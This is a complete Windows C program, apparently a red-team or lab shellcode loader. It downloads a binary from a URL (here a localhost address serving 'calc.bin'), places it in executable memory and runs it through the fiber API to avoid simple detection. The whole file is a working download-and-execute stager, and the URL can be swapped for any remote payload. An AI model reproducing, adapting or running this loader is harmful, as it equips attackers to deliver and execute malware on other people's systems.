#include <windows.h>
#include <stdio.h>
#include <wininet.h>

#pragma comment(lib, "wininet.lib")
#define S_URL "http://127.0.0.1:4445/calc.bin"

int main() {
	HINTERNET hInternet = NULL, hUrl = NULL;
	DWORD bytesRead = 0;
	LPVOID shellcode_mem = NULL;
	LPVOID fiber_main = NULL;
	LPVOID fiber_payload = NULL;

	hInternet = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);

	if (hInternet == NULL) {
		printf("InternetOpenA failed: %d\n", GetLastError());
		return 1;
	}
	hUrl = InternetOpenUrlA(hInternet, S_URL, NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
	if (hUrl == NULL) {
		printf("InternetOpenUrlA failed: %d\n", GetLastError());
		InternetCloseHandle(hInternet);
		return 1;
	}


	shellcode_mem = VirtualAlloc(NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	if (shellcode_mem == NULL) {
		printf("VirtualAlloc failed: %d\n", GetLastError());
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		return 1;
	}
	if (!InternetReadFile(hUrl, shellcode_mem, 4096, &bytesRead)) {
		printf("InternetReadFile failed: %d\n", GetLastError());
		VirtualFree(shellcode_mem, 0, MEM_RELEASE);
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		return 1;
	}

	fiber_main = ConvertThreadToFiber(NULL);
	if (fiber_main == NULL) {
		printf("ConvertThreadToFiber failed: %d\n", GetLastError());
		VirtualFree(shellcode_mem, 0, MEM_RELEASE);
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		return 1;
	}

	fiber_payload = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcode_mem, NULL);
	if (fiber_payload == NULL) {
		printf("CreateFiber failed: %d\n", GetLastError());
		VirtualFree(shellcode_mem, 0, MEM_RELEASE);
		InternetCloseHandle(hUrl);
		InternetCloseHandle(hInternet);
		return 1;
	}

	SwitchToFiber(fiber_payload);

	DeleteFiber(fiber_payload);
	InternetCloseHandle(hUrl);
	InternetCloseHandle(hInternet);
	return 0;

}


